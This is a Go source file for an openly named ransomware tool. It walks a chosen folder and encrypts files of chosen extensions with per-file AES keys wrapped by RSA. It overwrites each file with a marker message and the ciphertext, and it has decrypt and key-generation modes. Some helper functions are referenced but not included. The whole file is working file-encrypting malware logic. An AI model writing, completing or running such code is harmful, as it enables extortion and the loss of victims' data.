package main

import (
	"bytes"
	"crypto/rsa"
	"crypto/sha1"
	"flag"
	"io/ioutil"
	"log"
	"path/filepath"
)

const readKeyLen = 256
var encrypt_immune_files = []string {"ransomware.exe"}

var area =""
var infected_message = ""


func main() {

	kind := flag.String("kind", "", "Please select one of the values: encrypt | decrypt | keygen")
	keypath := flag.String("keypath", "", "Private Key path or Public Key path")
	flag.StringVar(&area, "area", "", "Folder path to infect.")
	flag.StringVar(&infected_message, "message", "hello", "Messages to be written to the infected file.")
	
    flag.Parse()

	if *kind == "encrypt" || *kind == "decrypt" {
		if area == "" {
			println("Input [area] parameter. Folder path to infect.")
			return
		}

		if *keypath == "" {
			println("Input the [keypath] parameters. 'encrypt' requires a private key and 'decrypt' requires a public key.")
			return
		}
	}

	if *kind == "encrypt" {
		encrypt_extension := flag.Args()
		if len(encrypt_extension) == 0 {
			println("Input the name of the extension to be infected in the last parameters.")
			return
		}

		publicKey := RSALoadPublicKey(keypath)

		if publicKey == nil{
			println("public key doesn't exists. keypath is", keypath)
			return
		}
		Doencrypt(publicKey, encrypt_extension)
		println("encrypted.")
	} else if *kind == "decrypt" {
		privateKey := RSALoadPrivateKey(keypath)
		if privateKey == nil{
			println("private key doesn't exists. keypath is ", keypath)
			return
		}
		DoDecrypt(privateKey)
		println("decrypted.")
	} else if *kind == "keygen" {
		RSACreateKey()
		println("public.key and private.key generated.")
	} else if *kind == "" {
		println("please input the [kind] option. select one of the values: encrypt | decrypt | keygen")
	} else {
		println("invalid kind " + *kind)
		return
	}
}

func Doencrypt(publicKey *rsa.PublicKey, encrypt_extension []string) {

	Walk(area, func(fpath string) {

		defer func() {
			if err := recover(); err != nil {
				log.Fatal(err)
				return
			}
		}()
		ext := filepath.Ext(fpath)
		

		if StringInSlice(filepath.Base(fpath), encrypt_immune_files) {
			println("[PASSED - IMMUNE] ", fpath)
			return
		}
		if !StringInSlice(ext, encrypt_extension) {
			println("[PASSED - EXT] ", fpath)
			return
		}
		read, err := ioutil.ReadFile(fpath)
		if err != nil {
			println("[READ FILE FAILED] ", fpath)
			return
		}
		imlen := len(infected_message)
		readlen := len(read)

		if imlen > readlen {
			println("[SIZE ERROR] ", fpath)
			return
		}
		if IsInfected(read) {
			println("[PASSED - ALREADY INFECTED] ", fpath)
			return
		}

		aesRandKey := []byte(randSeq(16))
		aesEncryptedRandKey := RSAencrypt(publicKey, aesRandKey)

		encryptedData, err := encryptByte(aesRandKey, read)
		if err != nil {
			log.Fatal(err)
			return
		}

		byteInfectedMessage := []byte(infected_message)

		b := [][]byte{byteInfectedMessage, aesEncryptedRandKey, encryptedData}
		b2 := bytes.Join(b, []byte(""))
		ioutil.WriteFile(fpath, b2, 0)
		println("[ENCRYPTED] ", fpath)
	})

}

func DoDecrypt(privateKey *rsa.PrivateKey) {

	Walk(area, func(fpath string) {
		defer func() {
			if err := recover(); err != nil {
				log.Fatal(err)
			}
		}()

		read, err := ioutil.ReadFile(fpath)
		if err != nil {
			println("[READ FILE ERROR] " + fpath)
			return
		}

		imlen := len(infected_message)
		readlen := len(read)

		if imlen > readlen {
			println("[SZIE ERROR] " + fpath)
			return
		}

		if !IsInfected(read) {
			println("[PASSED] " + fpath)
			return
		}

		dataStartIndex := imlen + readKeyLen

		aesEncryptedRandKey := read[imlen:dataStartIndex]
		datastr := read[dataStartIndex:]

		aesKey := RSADecrypt(privateKey, sha1.New(), aesEncryptedRandKey)
		decrypted, err := decryptByte(aesKey, datastr)
		if err != nil {
			println("[DECRYPT BYTE ERROR] " + fpath)
			return
		}

		err = ioutil.WriteFile(fpath, decrypted, 0)
		if err != nil {
			println("[WRITEFILE ERROR] " + fpath)
			return
		}
		println("[DECRYPTED] " + fpath)
	})
}

func IsInfected(read []byte) bool {

	imlen := len(infected_message)
	str := ""
	for i := 0; i < imlen; i++ {
		str += string(read[i])
	}

	if str == infected_message {
		return true
	} else {
		return false
	}
}
